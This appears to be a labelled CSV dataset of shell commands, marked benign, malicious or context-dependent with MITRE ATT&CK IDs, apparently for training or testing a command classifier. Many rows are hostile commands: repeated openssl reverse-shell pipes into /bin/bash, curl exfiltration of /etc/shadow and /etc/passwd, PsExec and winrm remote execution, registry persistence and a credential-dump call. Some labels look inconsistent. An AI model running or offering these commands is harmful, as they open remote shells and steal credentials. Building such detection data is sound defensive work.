command,label,original_label,mitre_id
htpasswd -b path/to/file username password,Benign,Benign,Benign
cdparanoia 3 'path/to/file.wav',Benign,Benign,Benign
ld path/to/file1.o path/to/file2.o [-o|--output] path/to/output_executable,Benign,Benign,Benign
pg_createsubscriber [-d|--database] dbname [-D|--pgdata] path/to/data [-P|--publisher-server] connstr,Benign,Benign,Benign
ssh -w 0:0 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
ostree refs --repo path/to/repo,Benign,Benign,Benign
ollama pull model,Benign,Benign,Benign
"echo ""1234567890"" > ""$file_to_manipulate""",Malicious,Malicious,T1070
wc -l file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
net time \\$computer_name,Malicious,Malicious,T1124
git blame -L 123 path/to/file,Benign,Benign,Benign
ntfyme log,Benign,Benign,Benign
errno name|code,Benign,Benign,Benign
ansible-vault encrypt --vault-password-file path/to/password_file path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9002,Malicious,Synthetic,Synthetic
valkey-cli -h host,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
"find . -name ""*.fq"" -print0 | xargs -0 -n 1 fastqc",Benign,Benign,Benign
pio home --shutdown-timeout time,Benign,Benign,Benign
check-language-support [-l|--language] en,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$remote_host -i -u $user_name -p $password -accepteula ""C:\Windows\System32\calc.exe""",Malicious,Malicious,T1569
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:3389,Malicious,Synthetic,Synthetic
rhash --printf '{{%p\t%s\t%{mtime}\t%m\n}}' path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
airshare code,Benign,Benign,Benign
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",Context_Dependent,Malicious,T1087
ports -u,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
id [-Gn|--groups --name],Benign,Benign,Benign
show cdp neighbors,Context_Dependent,Malicious,T1018
tftp server_ip -c command,Benign,Benign,Benign
find -name file -fprint file,Benign,Benign,Benign
find . -name * -exec ls -a {} \;,Benign,Benign,Benign
foreach ($port in $ports) {,Context_Dependent,Malicious,T1016
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:445,Malicious,Synthetic,Synthetic
lein new template_name project_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:53,Malicious,Synthetic,Synthetic
do_vslist,Context_Dependent,Malicious,T1083
readlink -f $(which java),Benign,Benign,Benign
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf",Benign,Benign,Benign
traceroute -n 10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:9002,Malicious,Synthetic,Synthetic
traceroute -n 10.0.0.10,Context_Dependent,Synthetic,Synthetic
nagios -s,Benign,Benign,Benign
cargo info package@version,Benign,Benign,Benign
sshuttle -r support@10.0.0.25 0/0,Context_Dependent,Synthetic,Synthetic
jj [b|bookmark] [d|delete] name,Benign,Benign,Benign
nxc ftp 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt --continue-on-success,Benign,Benign,Benign
elasticsearch-keystore remove setting_name,Benign,Benign,Benign
dotnet restore path/to/project_or_solution,Benign,Benign,Benign
youtube-dl [-x|--extract-audio] --audio-format mp3 'url',Benign,Benign,Benign
nnn -o,Benign,Benign,Benign
cat $File_to_output,Context_Dependent,Malicious,T1083
cargo metadata --no-deps,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:80 postgres@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8080,Malicious,Synthetic,Synthetic
sudo chmod 777 .git/hooks/prepare-commit-msg,Context_Dependent,Benign,Benign
ssh -fN -L 8080:10.0.0.50:8443 backup@payload.c2,Context_Dependent,Synthetic,Synthetic
time command,Benign,Benign,Benign
awk '!/^[[:space:]]*$/{++x} END{print x}' filename,Benign,Benign,Benign
cargo metadata --format-version version,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
pixi config prepend key value,Benign,Benign,Benign
tlmgr restore package,Benign,Benign,Benign
crunch 1 5 -o START -c 1000 -z gzip|bzip2|lzma|7z,Benign,Benign,Benign
pw-cat [-r|--record] [-m|--midi] path/to/file.mid,Benign,Benign,Benign
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",Malicious,Malicious,T1218
find /foldername | sort -n | tail -1,Benign,Benign,Benign
yard stats --list-undoc,Benign,Benign,Benign
tldr reg save|restore|load|unload,Benign,Benign,Benign
dig @some.other.ip.address domain. a,Benign,Benign,Benign
ftp -A host,Benign,Benign,Benign
%CommonFiles%,Malicious,Malicious,T1547
wsl-open https://example.com,Benign,Benign,Benign
mvn clean site,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
base64 /etc/shadow | curl -d @- http://192.168.0.10:4444/,Malicious,Synthetic,Synthetic
bun run path/to/file|script_name,Benign,Benign,Benign
pokego --name blastoise --form mega,Benign,Benign,Benign
sfdk emulator exec emulator,Benign,Benign,Benign
hyprshot [-m|--mode] output,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
Evil.txt.exe,Malicious,Malicious,T1036
alr init --bin|--lib project_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
x11docker [-p|--pulseaudio] --share $HOME/Videos jess/vlc,Benign,Benign,Benign
"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" \) -print0 | xargs -0 wc",Benign,Benign,Benign
paxs [-i|--install] package,Benign,Benign,Benign
axel [-S|--search=]number url,Benign,Benign,Benign
"echo ""Type=simple""",Malicious,Malicious,T1543
strace -e trace=file -p 5432,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.25:443 backup@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
ffprobe [-v|-loglevel] error -select_streams v:0 -show_entries stream=bit_rate [-of|-output_format] default=noprint_wrappers=1:nokey=1 input.mp4,Benign,Benign,Benign
find . -exec grep -l -e 'myregex' {} \; >> outfile.txt,Benign,Benign,Benign
gitea help,Benign,Benign,Benign
phar list -f path/to/phar_file,Benign,Benign,Benign
killall [-i|--interactive] process_name,Benign,Benign,Benign
setfont,Benign,Benign,Benign
find . -type f -exec cp {} /tmp +,Benign,Benign,Benign
dpkg-reconfigure package1 package2 ...,Benign,Benign,Benign
"find . -name ""*.php"" | pv --line-mode | xargs chmod 755",Benign,Benign,Benign
pueue start [-a|--all] --children,Benign,Benign,Benign
devspace deploy,Benign,Benign,Benign
"reg.exe import ""$registry_file""",Malicious,Malicious,T1546
deluged [-p|--port] port,Benign,Benign,Benign
qm [di|disk] [i|import] vm_id path/to/disk storage_name --format qcow2|raw|vmdk,Benign,Benign,Benign
rspamc symbols path/to/email_file,Benign,Benign,Benign
sgitopnm [-c|-channel] n path/to/input.sgi > path/to/output.pnm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:80 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
mate-screenshot --window,Benign,Benign,Benign
malloc,Malicious,Malicious,T1055
python3 -m http.server 8888,Context_Dependent,Synthetic,Synthetic
shc -f script,Benign,Benign,Benign
nodemon [-i|--ignore] path/to/file_or_directory,Benign,Benign,Benign
tar cf /path/to/temp-file.tar /path/to/temp-file,Malicious,Malicious,T1222
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
tldr tee,Benign,Benign,Benign
systemctl freeze unit1 unit2 ...,Benign,Benign,Benign
pwd | cut -f 1- -d\/ --output-delimiter=$'\n',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""$registry_value"" -Type MultiString",Malicious,Malicious,T1547
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
cat index.html | pup 'div json{}',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
es -sort name-ascending,Benign,Benign,Benign
PATH /?,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:80 support@192.168.1.1,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 host 172.16.5.20,Context_Dependent,Synthetic,Synthetic
namcap [-i|--info] path/to/file,Benign,Benign,Benign
pathchk -p path1 path2 ...,Benign,Benign,Benign
sleep 1d 3h,Benign,Benign,Benign
tunelp [-c|--chars] times [-t|--time] time_in_centiseconds /dev/lp0,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
sshuttle -r jenkins@corp-backup.internal 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
pamtowinicon path/to/input_file.pam > path/to/output.ico,Benign,Benign,Benign
ssh-add path/to/private_key,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
chars 10,Benign,Benign,Benign
svchost.exe,Malicious,Malicious,T1036
find . /home/admin/public_html/ -type f -exec chmod 644 {} \;,Benign,Benign,Benign
yes yes | sed -e 5s/yes/no/ -e 5q,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
"local -r variable=""value""",Benign,Benign,Benign
regedit -D path/to/registry_key,Benign,Benign,Benign
terraform output,Benign,Benign,Benign
w3m https://example.com -M,Benign,Benign,Benign
rustdoc src/lib.rs --crate-name name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9090,Malicious,Synthetic,Synthetic
nettacker --show-all-modules,Benign,Benign,Benign
"$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""",Malicious,Malicious,T1204
"x8 [-u|--url] https://example.com/ [-X|--method] POST [-b|--body] '{{{""x"":{%s\}\}}}' [-w|--wordlist] path/to/wordlist.txt",Benign,Benign,Benign
sudo aureport [-l|--login],Benign,Benign,Benign
dnf changelog --count number package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8443,Malicious,Synthetic,Synthetic
pgmkernel width height > path/to/output.pgm,Benign,Benign,Benign
sudo vgs [-a|--all],Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.254:6379 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:6379,Malicious,Synthetic,Synthetic
carp,Benign,Benign,Benign
newsboat [-i|--import-from-opml] my-feeds.xml,Benign,Benign,Benign
Set-Location -|+,Benign,Benign,Benign
netsh interface portproxy add v4tov4 listenport=$listenport connectport=$connectport connectaddress=$connectaddress,Malicious,Malicious,T1090
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
C:\Windows\system32\net.exe,Malicious,Malicious,T1574
openssl x509 -inform der -outform pem -in original_certificate_file -out converted_certificate_file,Benign,Benign,Benign
tcpdump -i enp0s3 port 22,Context_Dependent,Synthetic,Synthetic
winget [ls|list] [-s|--source] winget,Benign,Benign,Benign
slimrb --erb input.slim output.erb,Benign,Benign,Benign
doctl [d|databases] [mw|maintenance-window] [g|get] database_id,Benign,Benign,Benign
find . -type f -name \*,Benign,Benign,Benign
aws lightsail get-instances,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
bluetoothctl devices,Benign,Benign,Benign
curl -X POST -d @/etc/passwd http://10.0.0.1:8080/,Context_Dependent,Synthetic,Synthetic
acme.sh --issue --dns dns_cf [-d|--domain] *.example.com,Benign,Benign,Benign
"find ""$DIR"" -type f -exec grep ""$SEARCH"" {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
tcpdump -i enp0s3 -c 443,Context_Dependent,Synthetic,Synthetic
tcpdump -i ens33 port 4444,Context_Dependent,Synthetic,Synthetic
printenv LANG,Benign,Malicious,T1614
jbang run [-i|--interactive],Benign,Benign,Benign
tcpdump -i eth0 -w /tmp/capture.pcap,Context_Dependent,Synthetic,Synthetic
subfinder -d staging.lab,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
watch [-n|--interval] 60 command,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:5432 svcuser@example.com,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:22 svcuser@172.16.0.10,Context_Dependent,Synthetic,Synthetic
az logicapp restart [-n|--name] name [-g|--resource-group] resource_group,Benign,Benign,Benign
sudo killall -SIGTERM $process_name,Malicious,Malicious,T1489
Invoke-PowerDump,Malicious,Malicious,T1003
ssh -fN -L 8080:10.10.10.50:53 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
New-Item path\to\registry_key,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
docker [exec|container exec] [-d|--detach] container_name command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
sc query windefend,Context_Dependent,Malicious,T1518
ssh -fN -L 8080:192.168.1.10:9090 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
linode-cli domains records-create domain_id --type A|AAAA|CNAME|MX|... --name subdomain --target target_value,Benign,Benign,Benign
"find / -type f -regextype posix-extended -regex '.*/.{1,24}$'",Context_Dependent,Benign,Benign
kubectl apply edit-last-applied [-f|--filename] path/to/file,Benign,Benign,Benign
ssh -w 0:0 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
phpunit,Benign,Benign,Benign
doctl [d|databases] [u|user] command [-t|--access-token] access_token,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
op item create --category category_name,Benign,Benign,Benign
sudo oma remove package_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:4444,Malicious,Synthetic,Synthetic
"echo ""password"" | md5sum",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
pint -v,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:9002,Malicious,Synthetic,Synthetic
sudo -l -U root,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
fondue /enable-feature:feature /hide-ux:all,Benign,Benign,Benign
sudo ldconfig -n path/to/directory,Benign,Benign,Benign
rsync -av $myFolder .,Benign,Benign,Benign
pg_ctl [-D|--pgdata] data_directory restart,Benign,Benign,Benign
dust [-d|--depth] 3,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:6379,Malicious,Synthetic,Synthetic
mvn package,Benign,Synthetic,Synthetic
"echo ""Hello World!"" | sm -",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
istats,Benign,Benign,Benign
hexedit [-m|--maximize] path/to/file,Benign,Benign,Benign
"gh search issues -- ""search_query -label:label_name""",Benign,Benign,Benign
gzip [-cd|--stdout --decompress] path/to/file.gz > path/to/uncompressed_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
hipstopgm path/to/file.hips,Benign,Benign,Benign
"dolt commit [-m|--message] ""commit_message""",Benign,Benign,Benign
"read -n1 -p ""Pick a letter to run a command [A, B, or C for more info] "" runCommand",Benign,Benign,Benign
pct [ex|exec] 100 command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
tcpdump -i ens33 -c 9001,Context_Dependent,Synthetic,Synthetic
env | grep '^variable=',Context_Dependent,Benign,Benign
tcpdump -i eth0 -w /tmp/.job,Context_Dependent,Synthetic,Synthetic
lvmdiskscan [-l|--lvmpartition],Benign,Benign,Benign
find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
ansible-inventory --list [-i|--inventory-file] path/to/file_or_script_or_directory,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:995 backup@update.bad,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.25:4444 admin@example.com,Context_Dependent,Synthetic,Synthetic
find . 2>&1 | grep -v 'Permission denied' > some_file,Benign,Benign,Benign
acyclic -v -n path/to/input.gv,Benign,Benign,Benign
emacsclient [-c|--create-frame] path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
sshuttle -r postgres@corp-backup.internal 0/0,Context_Dependent,Synthetic,Synthetic
immich upload [-r|--recursive] path/to/directory [-H|--include-hidden],Benign,Benign,Benign
starship init bash|elvish|fish|ion|powershell|tcsh|zsh,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.5:80 svcuser@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
pdftoppm -gray path/to/file.pdf image_name_prefix,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
php path/to/file,Benign,Benign,Benign
"cat file | grep pattern | paste -sd'~' | sed -e 's/~/"" ""/g'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
%SystemRoot%\System32\Config,Malicious,Malicious,T1027
nuclei -tl [-pt|-type] dns|file|http|headless|tcp|workflow|ssl|websocket|whois|code|javascript,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:9090 root@10.0.0.1,Context_Dependent,Synthetic,Synthetic
VSDiagnostics.exe start 1 /launch:{PATH:.exe},Malicious,Malicious,T1127
ssh -fN -L 8080:10.10.10.50:5432 postgres@10.10.10.25,Context_Dependent,Synthetic,Synthetic
--init,Malicious,Malicious,T1036
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
add-apt-repository [-r|--remove] repository_spec,Benign,Benign,Benign
sftp host,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:9002,Malicious,Synthetic,Synthetic
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",Malicious,Malicious,T1562
ssh -fN -L 8080:172.16.5.20:80 operator@update.bad,Context_Dependent,Synthetic,Synthetic
aider --help,Benign,Benign,Benign
"false | echo ""${PIPESTATUS[0]}""",Benign,Benign,Benign
enum4linux -a remote_host,Context_Dependent,Benign,Benign
desc table_name partition (partition_spec);,Benign,Benign,Benign
openrgb [-m|--mode] off|static|breathing|rainbow|flashing|... [-c|--color] random|red|00AAFF|...,Benign,Benign,Benign
gcloud compute instances list,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:22 jenkins@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
ipcalc 192.168.0.1/24,Benign,Benign,Benign
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",Malicious,Malicious,T1216
stress [-d|--hdd] 2 --hdd-bytes 1GB,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
msiexec /q /i {REMOTEURL},Malicious,Malicious,T1218
pmset -g batt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
mount -o bind /bin/sh /bin/mount,Malicious,Malicious,T1548
git pull remote_name branch,Benign,Benign,Benign
distrobox-enter [-n|--name] container_name -- uptime --pretty,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9002,Malicious,Synthetic,Synthetic
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",Malicious,Malicious,T1564
taskmgr,Malicious,Malicious,T1036
ssh -fN -L 8080:10.0.0.100:80 operator@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
cat /proc/self/maps,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force",Malicious,Malicious,T1484
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,Context_Dependent,Malicious,T1012
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:9002,Malicious,Synthetic,Synthetic
RegWrite,Malicious,Malicious,T1559
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.10:110 root@192.168.1.100,Context_Dependent,Synthetic,Synthetic
